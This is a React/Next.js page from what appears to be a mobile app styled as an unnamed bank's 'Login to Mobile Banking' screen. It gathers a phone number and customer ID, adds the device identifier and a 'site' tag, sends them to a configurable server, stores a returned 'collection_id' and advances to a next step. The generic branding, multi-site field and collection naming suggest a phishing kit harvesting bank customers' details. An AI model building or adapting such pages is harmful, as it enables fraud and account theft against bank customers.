'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  
import styles from './start.module.css';
import DateInputComponent from "../inlcude/DateInputComponent";
import { Device } from '@capacitor/device';


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;
    useEffect(()=>{
        localStorage.removeItem('collection_id');
    })
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['mobile_id'] = (await Device.getId()).identifier;
        console.log(jsonObject1);
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem('collection_id', responseData.data);
            router.push('/2');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    }
  return (
    <>
    <Header />
    <div className="container">
      <h5 className={`${styles.textCenterDiv} primary-color mt-5 mb-4`}><strong>Login to Mobile Banking</strong></h5>
      <form onSubmit={handleSubmit} >
        <div className={`form-group ${styles.inputDiv}`}>
            <label>Mobile Number <span className="text-danger">*</span></label>
            <input type="text" placeholder="Mobile Number" name="mobbile" className={`form-control ${styles.formInput}`} minLength={10} maxLength={10} inputMode="numeric" required />
          </div>
          <div className={`form-group ${styles.inputDiv}`}>
            <label>Customer Id <span className="text-danger">*</span></label>
            <input type="text" placeholder="Customer Id" name="custid" className={`form-control ${styles.formInput}`} required />
          </div>
          <div className="d-flex justify-content-center mt-4">
            <button type="submit"  className="btn button-bg btn-warning"> LOGIN </button>
          </div>
        </form>

        <h6 className="text-center mt-5">
          To Know your Custoomer id give a missed call on 9029006575
        </h6>
  
    </div>

    <Footer />
</>
  );
}
